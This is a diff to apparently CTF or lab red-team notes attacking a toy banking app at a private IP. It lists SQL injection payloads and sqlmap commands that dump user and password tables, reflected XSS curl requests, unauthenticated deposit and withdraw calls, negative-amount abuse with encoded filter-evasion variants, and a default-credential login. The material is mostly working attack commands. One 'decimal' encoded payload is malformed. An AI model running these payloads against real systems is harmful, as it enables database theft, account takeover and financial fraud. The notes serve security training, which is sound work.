@@ -1,5 +1,5 @@
 Red:
-    1 SQL Injection on the user parameter when requesting the balance.
+    1. SQL Injection on the user parameter when requesting the balance.
         In user param: a' OR 1=1 -- 
         
         With sqlmap: 
@@ -7,21 +7,42 @@ Red:
         Discover tables: sqlmap -u "http://10.1.5.2/process.php?user=aa&pass=aa&drop=balance" -p "user" -D ctf2 --tables
         Dump users table: sqlmap -u "http://10.1.5.2/process.php?user=aa&pass=aa&drop=balance" -p "user" -D ctf2 -T users --dump
         Dump transfers table: sqlmap -u "http://10.1.5.2/process.php?user=aa&pass=aa&drop=balance" -p "user" -D ctf2 -T transfers --dump
+        ## To do => check with sqlmap other types of requests.
 
         Compromise user accounts with sql injection:
         All usernames: http://10.1.5.2/process.php?user=a%27+OR+1%3D1+UNION+select+null%2C+pass%2C+user+from+users%3B+--+&pass=aa&amount=&drop=balance
         All passwords: http://10.1.5.2/process.php?user=a%27+OR+1%3D1+UNION+select+null%2C+user%2C+pass+from+users%3B+--+&pass=aa&amount=&drop=balance
 
-    2 Reflected XSS
+        Find database user with sql injection:
+        http://10.1.5.2/process.php?user=%27+UNION+select+null%2C+null+user()+--+&pass=aa&drop=balance
+
+        Find database version with sql injection:
+        http://10.1.5.2/process.php?user=%27+UNION+select+null%2C+null+database()+--+&pass=aa&drop=balance
+
+    2. Reflected XSS
         In user parameter:
             curl "http://10.1.5.2/process.php?user=<script>alert(1)</script>&pass=temp&drop=balance"
+            curl "http://10.1.5.2/process.php?user=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&pass=temp&drop=balance"
         In pass parameter:
             curl "http://10.1.5.2/process.php?user=temp&pass=</script><script>alert("xss")</script><script>&drop=register"
         
-    3 No authentication when making deposits and withdrawals.
+    3. No authentication when making deposits and withdrawals.
         curl "http://10.1.5.2/process.php?user=temp&pass=temp&amount=100&drop=deposit"
         curl "http://10.1.5.2/process.php?user=temp&pass=temp&amount=100&drop=withdraw"
 
-    4 Possible to insert amount with negative sign
-        curl "http://10.1.5.2/process.php?user=temp&pass=temp&amount=-1000&drop=deposit"
+    4. Possible to insert amount with negative sign
+        Deposit with negative sign
+            curl "http://10.1.5.2/process.php?user=temp&pass=temp&amount=-1000&drop=deposit"
+            Decimal Ascii Encoded Payload:
+            curl "http://10.1.5.2/process.php?%117%115%101%114%61%116%101%109%112%38%112%97%115%115%61%116%101%109%112%38%97%109%111%117%110%116%61%45%49%48%48%48%38%100%114%111%112%61%100%101%112%111%115%105%116"
+            Hex Ascii Encoded Payload:
+            curl "http://10.1.5.2/process.php?%75%73%65%72%3D%74%65%6D%70%26%70%61%73%73%3D%74%65%6D%70%26%61%6D%6F%75%6E%74%3D%2D%31%30%30%30%26%64%72%6F%70%3D%64%65%70%6F%73%69%74
+            Hex Ascii Encoded only amount:
+            curl "http://10.1.5.2/process.php?user=temp&pass=temp&amount=%2D%31%30%30%30&drop=deposit"
+        
         curl "http://10.1.5.2/process.php?user=temp&pass=temp&amount=-1000&drop=withdraw"
+        curl "http://10.1.5.2/process.php?user=temp&pass=temp&amount=%2D%31%30%30&drop=withdraw"
+
+    5. Check if default creadentials work
+        curl "http://10.1.5.2/process.php?user=jelena&pass=abcdef&drop=balance"
+        
